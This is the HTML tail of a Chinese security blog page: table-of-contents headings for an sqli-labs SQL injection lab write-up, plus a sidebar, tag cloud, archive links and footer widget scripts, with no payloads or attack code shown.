toc-level-4"><a class="toc-link" href="#基于报错的sql盲注–构造playload让信息通过错误提示回显出来"><span class="toc-text">基于报错的sql盲注–构造playload让信息通过错误提示回显出来</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#基于时间的SQL盲注–延时注入"><span class="toc-text">基于时间的SQL盲注–延时注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less5"><span class="toc-text">less5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less6"><span class="toc-text">less6</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Background-3-导入与导出相关操作"><span class="toc-text">Background-3 导入与导出相关操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#load-file-导出文件"><span class="toc-text">load_file()导出文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件导入到数据库"><span class="toc-text">文件导入到数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#导入到文件"><span class="toc-text">导入到文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less7"><span class="toc-text">less7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less8"><span class="toc-text">less8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less9"><span class="toc-text">less9</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less10"><span class="toc-text">less10</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less11"><span class="toc-text">less11</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less12"><span class="toc-text">less12</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less13"><span class="toc-text">less13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less14"><span class="toc-text">less14</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less15"><span class="toc-text">less15</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less16"><span class="toc-text">less16</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Background-4-数据库增删改查"><span class="toc-text">Background-4   数据库增删改查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#less17"><span class="toc-text">less17</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Background-5-HTTP头部介绍"><span class="toc-text">Background-5 HTTP头部介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#less18"><span class="toc-text">less18</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less19"><span class="toc-text">less19</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less20"><span class="toc-text">less20</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less21"><span class="toc-text">less21</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less22"><span class="toc-text">less22</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二部分-page-2-Adv-Injections"><span class="toc-text">第二部分&#x2F;page-2 Adv Injections</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#less23"><span class="toc-text">less23</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less24"><span class="toc-text">less24</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less25"><span class="toc-text">less25</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less25a"><span class="toc-text">less25a</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less26"><span class="toc-text">less26</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less26a"><span class="toc-text">less26a</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less27"><span class="toc-text">less27</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less27a"><span class="toc-text">less27a</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less28"><span class="toc-text">less28</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less28a"><span class="toc-text">less28a</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Background-6-服务器（两层）架构"><span class="toc-text">Background-6 服务器（两层）架构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#less29"><span class="toc-text">less29</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less30"><span class="toc-text">less30</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less31"><span class="toc-text">less31</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Background-7-宽字节注入"><span class="toc-text">Background-7 宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#less32"><span class="toc-text">less32</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less33"><span class="toc-text">less33</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less34"><span class="toc-text">less34</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less35"><span class="toc-text">less35</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less36"><span class="toc-text">less36</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less-37"><span class="toc-text">less-37</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三部分-page-3-Stacked-injection"><span class="toc-text">第三部分&#x2F;page-3 Stacked injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Background-8-stacked-injection"><span class="toc-text">Background-8 stacked injection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-原理介绍"><span class="toc-text">0x01 原理介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-堆叠注入的局限性"><span class="toc-text">0x02 堆叠注入的局限性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-Mysql示例"><span class="toc-text">0x03 Mysql示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less-38"><span class="toc-text">less-38</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less39"><span class="toc-text">less39</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less40"><span class="toc-text">less40</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less41"><span class="toc-text">less41</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less42"><span class="toc-text">less42</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less43"><span class="toc-text">less43</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less44"><span class="toc-text">less44</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less45"><span class="toc-text">less45</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Background-9-order-by-后的injection"><span class="toc-text">Background-9 order by 后的injection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#less46"><span class="toc-text">less46</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less47"><span class="toc-text">less47</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less48"><span class="toc-text">less48</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less49"><span class="toc-text">less49</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less50"><span class="toc-text">less50</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less51"><span class="toc-text">less51</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less52"><span class="toc-text">less52</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less53"><span class="toc-text">less53</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第四部分-page-4-Challenges"><span class="toc-text">第四部分&#x2F;page-4 Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#less54"><span class="toc-text">less54</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less55"><span class="toc-text">less55</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less56"><span class="toc-text">less56</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less57"><span class="toc-text">less57</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less58"><span class="toc-text">less58</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less59"><span class="toc-text">less59</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less60"><span class="toc-text">less60</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less61"><span class="toc-text">less61</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less62"><span class="toc-text">less62</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less63"><span class="toc-text">less63</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less64"><span class="toc-text">less64</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less65"><span class="toc-text">less65</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="widget"><div class="widget-title"><i class="fa fa-xie"> 最新文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/10/07/XSS%E8%A7%A6%E5%8F%91%E7%9A%84%E6%96%B9%E5%BC%8F/">XSS触发的方式</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/29/Web%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E3%80%81%E5%8D%B1%E5%AE%B3%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%A6%82%E8%BF%B0/">Web系统漏洞基本原理、危害及修复概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/29/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E3%80%81%E5%8D%B1%E5%AE%B3%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%A6%82%E8%BF%B0/">Web应用漏洞基本原理、危害及修复概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/29/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E3%80%81%E5%8D%B1%E5%AE%B3%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%A6%82%E8%BF%B0/">Web中间件漏洞基本原理、危害及修复概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/">DVWA关卡纪录</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/27/sqli-labs-writeup/">sqli-labs-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/28/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E8%80%83%E6%A0%B8%E9%83%A8%E5%88%86writeup/">实验室考核部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/16/%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E8%AE%BE-%E5%9F%BA%E4%BA%8Ephp%E4%B8%8Ehtml%E7%9A%84cpu%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/">网络操作系统课设--基于php与html的cpu调度算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/19/ubuntu16-04-%E6%90%AD%E5%BB%BAemail%E6%9C%8D%E5%8A%A1%E5%99%A8/">ubuntu16.04 搭建email服务器</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/16/ISCC2019%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">ISCC2019部分题解</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-biao"> 标签</i></div><div class="tagcloud"><a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 15px;">web安全</a> <a href="/tags/Subject/" style="font-size: 15px;">Subject</a> <a href="/tags/start/" style="font-size: 15px;">start</a> <a href="/tags/ctf/" style="font-size: 15px;">ctf</a> <a href="/tags/web%E5%AE%89%E5%85%A8-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/" style="font-size: 15px;">web安全 黑盒测试</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-archive"> 归档</i></div><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">10</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-you"> 友情链接</i></div><ul></ul><a href="https://nikoeurus.github.io/" title="Somnus's blog" target="_blank">Somnus's blog</a></div></div></div></div><a id="totop" href="#top"></a><div id="footer"><div class="footer-info"><p><a href="/baidusitemap.xml">网站地图</a> |  <a href="/atom.xml">订阅本站</a> |  <a href="/about/">联系博主</a></p><p>本站总访问量：<i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>次，本站总访客数:<i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>人</p><p><span> Copyright &copy;<a href="/." rel="nofollow">fzykn06.</a></span><span> Theme by<a rel="nofollow" target="_blank" href="https://github.com/chaooo/hexo-theme-BlueLake"> BlueLake.</a></span><span> Count by<a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener"> busuanzi.</a></span><span> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a></span></p></div></div></div><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.json.js?v=2.0.4"></script><script type="text/javascript" src="/js/toctotop.js?v=2.0.4" async></script><link rel="stylesheet" type="text/css" href="/share/css/share.css"><script type="text/javascript" src="/share/js/social-share.js" charset="utf-8"></script><script type="text/javascript" src="/share/js/qrcode.js" charset="utf-8"></script><script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":["mshare","weixin","tsina","qzone","linkedin","fbook","twi","print","renren","sqq","evernotecn","bdysc","tqq","tqf","bdxc","kaixin001","tieba","douban","bdhome","thx","ibaidu","meilishuo","mogujie","diandian","huaban","duitang","hx","fx","youdao","sdo","qingbiji","people","xinhua","mail","isohu","yaolan","wealink","ty","iguba","h163","copy"],"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{},"image":{"viewList":["tsina","qzone","weixin","fbook","twi","linkedin","youdao","evernotecn","mshare"],"viewText":"分享到：","viewSize":"16"},"selectShare":{"bdContainerClass":null,"bdSelectMiniList":["tsina","qzone","weixin","fbook","twi","linkedin","youdao","evernotecn","mshare"]}};with(document)0[(getElementsByTagName('head')[0]||head).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
</script><script>var jiathis_config={
    data_track_clickback:true,
    summary:"",
    shortUrl:true,
    hideMore:false
}</script><script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script></body></html>